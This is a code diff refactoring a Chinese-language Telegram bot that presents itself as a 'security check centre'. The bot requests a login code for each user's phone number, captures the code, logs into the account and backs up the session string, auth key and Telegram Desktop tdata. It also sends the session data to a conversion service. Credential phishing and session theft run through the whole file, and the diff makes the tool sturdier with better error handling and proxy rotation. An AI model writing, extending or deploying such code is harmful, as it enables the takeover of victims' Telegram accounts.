@@ -1,15 +1,22 @@
 # coding=utf-8
+import asyncio
 import json
 import os
 import shutil
-import asyncio
+import logging
 from concurrent.futures import ThreadPoolExecutor
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 import telethon
 from dotenv import load_dotenv
 from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram import Update
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ContextTypes
+from telegram.ext import Updater, CommandHandler, MessageHandler, ContextTypes, filters
 from telethon import TelegramClient
 
 try:
@@ -26,8 +33,8 @@ except ImportError:
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-API_URL = os.getenv("API_URL", "http://127.0.0.1:8002")
-IMAGE_PATH = r"C:\Users\Thikbook\Pictures\photo_2026-03-27_06-50-13.jpg"
+API_URL = os.getenv("API_URL", "http://backend:8000")
+IMAGE_PATH = os.getenv("BOT_IMAGE_PATH", "/app/images/success.jpg")
 SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
 BOT_USERNAME = "安全检测中心"
 
@@ -35,7 +42,7 @@ API_ID = int(os.getenv("API_ID"))
 API_HASH = str(os.getenv("API_HASH"))
 PROXY_TYPE = os.getenv("PROXY_TYPE", "socks5")
 
-print(f"API_ID={API_ID}, API_HASH={API_HASH[:10]}...")
+logger.info(f"API_ID={API_ID}, API_HASH=***")
 
 def parse_proxy_list():
     proxies = []
@@ -64,7 +71,7 @@ def parse_proxy_list():
     return proxies
 
 PROXY_LIST = parse_proxy_list()
-print(f"已加载 {len(PROXY_LIST)} 个代理")
+logger.info(f"已加载 {len(PROXY_LIST)} 个代理")
 
 # 并发任务处理 - 后台线程池
 MAX_WORKERS = int(os.getenv("BOT_MAX_WORKERS", "8"))
@@ -96,7 +103,7 @@ async def get_telethon_client(user_id=None, proxy_index=None, fresh_session=Fals
             p_info = f"{proxy[1]}:{proxy[2]}"
             if len(proxy) > 4:
                 p_info += f" ({proxy[4]})"
-            print(f"[用户 {user_id}] 使用代理 {idx+1}/{len(PROXY_LIST)}: {p_info}")
+            logger.info(f"[用户 {user_id}] 使用代理 {idx+1}/{len(PROXY_LIST)}: {p_info}")
         
         session_name = f'telebot_session_u{user_id}' if fresh_session else 'telebot_session'
         
@@ -107,13 +114,13 @@ async def get_telethon_client(user_id=None, proxy_index=None, fresh_session=Fals
             else:
                 try:
                     await c.disconnect()
-                except:
-                    pass
+                except Exception:
+                    logger.warning("断开旧连接失败")
         
-        print(f"[DEBUG] Creating TelegramClient:")
-        print(f"  session_name = {session_name}")
-        print(f"  API_ID = {API_ID} (type: {type(API_ID)})")
-        print(f"  API_HASH = {API_HASH} (type: {type(API_HASH)})")
+        logger.debug(f"Creating TelegramClient:")
+        logger.debug(f"  session_name = {session_name}")
+        logger.debug(f"  API_ID = {API_ID} (type: {type(API_ID)})")
+        logger.debug(f"  API_HASH = {API_HASH} (type: {type(API_HASH)})")
         
         client = TelegramClient(
             session=session_name,
@@ -129,6 +136,14 @@ async def get_telethon_client(user_id=None, proxy_index=None, fresh_session=Fals
         telethon_clients[user_id] = client
         client_proxy_index[user_id] = idx
         return client
+    except telethon.errors.rpcerrorlist.PeerFloodError:
+        raise Exception("连接失败: 账号被限流，请稍后重试")
+    except telethon.errors.rpcerrorlist.FloodWaitError as e:
+        raise Exception(f"连接失败: 操作过于频繁，需等待 {e.seconds} 秒")
+    except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
+        raise Exception("连接失败: 需要输入密码")
+    except ConnectionError as e:
+        raise Exception(f"连接失败: 网络错误 - {str(e)}")
     except Exception as e:
         raise Exception(f"连接失败: {str(e)}")
 
@@ -141,7 +156,7 @@ async def rotate_proxy(user_id):
     p_info = f"{p[1]}:{p[2]}"
     if len(p) > 4:
         p_info += f" ({p[4]})"
-    print(f"[用户 {user_id}] 切换到代理 {next_idx+1}/{len(PROXY_LIST)}: {p_info}")
+    logger.info(f"[用户 {user_id}] 切换到代理 {next_idx+1}/{len(PROXY_LIST)}: {p_info}")
     client_proxy_index[user_id] = next_idx
     return next_idx
 
@@ -152,17 +167,18 @@ def reset_user_state(user_id):
 async def backup_session(phone_number, client):
     phone_folder = None
     try:
-        os.makedirs(SESSIONS_DIR, exist_ok=True)
+        await asyncio.to_thread(os.makedirs, SESSIONS_DIR, exist_ok=True)
         
         phone_folder = os.path.join(SESSIONS_DIR, phone_number)
         if os.path.exists(phone_folder):
-            shutil.rmtree(phone_folder)
-        os.makedirs(phone_folder)
+            await asyncio.to_thread(shutil.rmtree, phone_folder)
+        await asyncio.to_thread(os.makedirs, phone_folder)
         
         session = client.session
         if not session.auth_key:
-            shutil.rmtree(phone_folder)
-            print("备份失败: 无auth_key")
+            if phone_folder and os.path.exists(phone_folder):
+                await asyncio.to_thread(shutil.rmtree, phone_folder)
+            logger.error("备份失败: 无auth_key")
             return False
         
         from telethon.sessions import StringSession
@@ -174,8 +190,8 @@ async def backup_session(phone_number, client):
         
         session_str = string_session.save()
         
-        with open(os.path.join(phone_folder, 'telethon密钥.txt'), 'w', encoding='utf-8') as f:
-            f.write(session_str)
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(None, lambda: open(os.path.join(phone_folder, 'telethon密钥.txt'), 'w', encoding='utf-8').write(session_str))
         
         try:
             me = await client.get_me()
@@ -188,38 +204,36 @@ async def backup_session(phone_number, client):
                 'dc_id': str(session.dc_id),
                 'session_string': str(session_str)
             }
-            with open(os.path.join(phone_folder, '账号信息.json'), 'w', encoding='utf-8') as f:
-                json.dump(account_info, f, ensure_ascii=False, indent=2)
+            await loop.run_in_executor(None, lambda: json.dump(account_info, open(os.path.join(phone_folder, '账号信息.json'), 'w', encoding='utf-8'), ensure_ascii=False, indent=2))
         except Exception as e:
-            print(f"获取账号信息失败: {e}")
+            logger.error(f"获取账号信息失败: {e}")
         
-        shutil.copy2('.env', os.path.join(phone_folder, '.env'))
+        # 注意：不再复制.env文件，包含敏感信息
         
         if os.path.exists('telebot_session.session'):
-            shutil.copy2('telebot_session.session', os.path.join(phone_folder, 'telebot_session.session'))
+            await asyncio.to_thread(shutil.copy2, 'telebot_session.session', os.path.join(phone_folder, 'telebot_session.session'))
         
         if TELEPOT_AVAILABLE:
             try:
                 tdata_folder = os.path.join(phone_folder, 'tdata')
-                os.makedirs(tdata_folder, exist_ok=True)
+                await asyncio.to_thread(os.makedirs, tdata_folder, exist_ok=True)
                 
                 api = API.TelegramDesktop.Generate()
                 telethon_client = TelethonToDesktop(session_str, api=api)
                 
                 await telethon_client.ToTDesktop(flag=UseCurrentSession)
-                print(f"tdata 备份成功")
+                logger.info("tdata 备份成功")
             except Exception as e:
-                print(f"tdata 备份失败: {e}")
+                logger.error(f"tdata 备份失败: {e}")
         
         telegram_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Telegram.exe')
         if os.path.exists(telegram_exe):
             try:
-                shutil.copy2(telegram_exe, os.path.join(phone_folder, 'Telegram.exe'))
-                print(f"客户端复制成功")
+                await asyncio.to_thread(shutil.copy2, telegram_exe, os.path.join(phone_folder, 'Telegram.exe'))
+                logger.info("客户端复制成功")
             except Exception as e:
-                print(f"客户端复制失败(可能被占用): {e}")
+                logger.warning(f"客户端复制失败(可能被占用): {e}")
         
-        # 备份成功后，尝试调用独立的会话转换服务，将备份数据转换为 tdata
         try:
             payload = {
                 "backup": {
@@ -231,21 +245,20 @@ async def backup_session(phone_number, client):
                 }
             }
             tdata_resp = await to_tdata(payload)
-            with open(os.path.join(phone_folder, 'tdata_response.json'), 'w', encoding='utf-8') as f:
-                json.dump(tdata_resp, f, ensure_ascii=False, indent=2)
+            await loop.run_in_executor(None, lambda: json.dump(tdata_resp, open(os.path.join(phone_folder, 'tdata_response.json'), 'w', encoding='utf-8'), ensure_ascii=False, indent=2))
         except Exception as e:
-            print(f"调用转换服务失败: {e}")
-        print(f"备份成功: {phone_folder}")
+            logger.warning(f"调用转换服务失败: {e}")
+        logger.info(f"备份成功: {phone_folder}")
         return True
     except Exception as e:
-        print(f"备份失败: {e}")
+        logger.error(f"备份失败: {e}")
         if phone_folder and os.path.exists(phone_folder):
-            shutil.rmtree(phone_folder)
+            await asyncio.to_thread(shutil.rmtree, phone_folder)
         return False
 
 async def start(update, context):
     user_id = update.effective_user.id
-    print(f"[DEBUG] start 被触发, user_id={user_id}, args={context.args}")
+    logger.debug(f"start 被触发, user_id={user_id}, args={context.args}")
     var = None
     if context.args:
         var = context.args[0] if context.args else None
@@ -323,17 +336,17 @@ async def handle_code_request(update, context):
         try:
             await client.connect()
         except Exception as e:
-            print(f"连接错误: {e}")
+            logger.error(f"连接错误: {e}")
             await update.message.reply_text("连接失败，正在重试...", reply_markup=create_restart_button())
             if user_id in telethon_clients:
                 try:
                     await telethon_clients[user_id].disconnect()
-                except:
-                    pass
+                except Exception:
+                    logger.warning("断开连接失败")
                 del telethon_clients[user_id]
             client = await get_telethon_client(user_id, fresh_session=True)
             await client.connect()
-        print(f"发送验证码到: {phone}")
+        logger.info(f"发送验证码到: {phone}")
         result = await client.send_code_request(phone)
         user_states[user_id]["state"] = "code_sent"
         user_states[user_id]["phone_code_hash"] = str(result.phone_code_hash) if result.phone_code_hash else ""
@@ -343,8 +356,16 @@ async def handle_code_request(update, context):
             "验证码已发送。\n您会收到一条系统消息。\n\n请按以下格式输入 5 位验证码。\n格式：TG + 5 位数字，例如：TG12345",
             reply_markup=reply_markup
         )
+    except telethon.errors.rpcerrorlist.PhoneNumberOccupiedError:
+        await update.message.reply_text("该号码已被注册，请更换号码后重试。", reply_markup=create_restart_button())
+    except telethon.errors.rpcerrorlist.PhoneNumberInvalidError:
+        await update.message.reply_text("手机号格式无效，请检查后重试。", reply_markup=create_restart_button())
+    except telethon.errors.rpcerrorlist.FloodWaitError as e:
+        await update.message.reply_text(f"操作过于频繁，请等待 {e.seconds} 秒后重试。", reply_markup=create_restart_button())
+    except telethon.errors.rpcerrorlist.PeerFloodError:
+        await update.message.reply_text("发送过于频繁，请稍后再试。", reply_markup=create_restart_button())
     except Exception as e:
-        await update.message.reply_text(f"发送验证码失败: {str(e)}", reply_markup=create_restart_button())
+        await update.message.reply_text(f"发送验证码失败，请重试。", reply_markup=create_restart_button())
 
 async def handle_message(update, context):
     user_id = update.effective_user.id
@@ -478,17 +499,17 @@ async def share_callback(update, context):
     await start(update, context)
 
 def main():
-    updater = Updater(token=BOT_TOKEN, use_context=True)
+    updater = Updater(BOT_TOKEN)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("start", start))
     dp.add_handler(CommandHandler("restart", handle_restart))
-    dp.add_handler(MessageHandler(Filters.CONTACT, handle_contact))
-    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
-    dp.add_handler(MessageHandler(Filters.document, handle_photo))
-    dp.add_handler(MessageHandler(Filters.text & Filters.regex("获取验证码"), handle_code_request))
-    dp.add_handler(MessageHandler(Filters.text & Filters.regex("重新验证"), handle_restart))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
-    print("Bot 已启动")
+    dp.add_handler(MessageHandler(filters.CONTACT, handle_contact))
+    dp.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    dp.add_handler(MessageHandler(filters.Document, handle_photo))
+    dp.add_handler(MessageHandler(filters.TEXT & filters.Regex("获取验证码"), handle_code_request))
+    dp.add_handler(MessageHandler(filters.TEXT & filters.Regex("重新验证"), handle_restart))
+    dp.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    logger.info("Bot 已启动")
     updater.start_polling()
     updater.idle()
 
@@ -498,10 +519,10 @@ if __name__ == "__main__":
         try:
             main()
         except KeyboardInterrupt:
-            print("收到停止信号，机器人已关闭。")
+            logger.info("收到停止信号，机器人已关闭。")
             break
         except Exception as e:
-            print(f"机器人发生异常: {str(e)}")
-            print("5秒后自动重启...")
+            logger.error(f"机器人发生异常: {str(e)}")
+            logger.info("5秒后自动重启...")
             import time
             time.sleep(5)
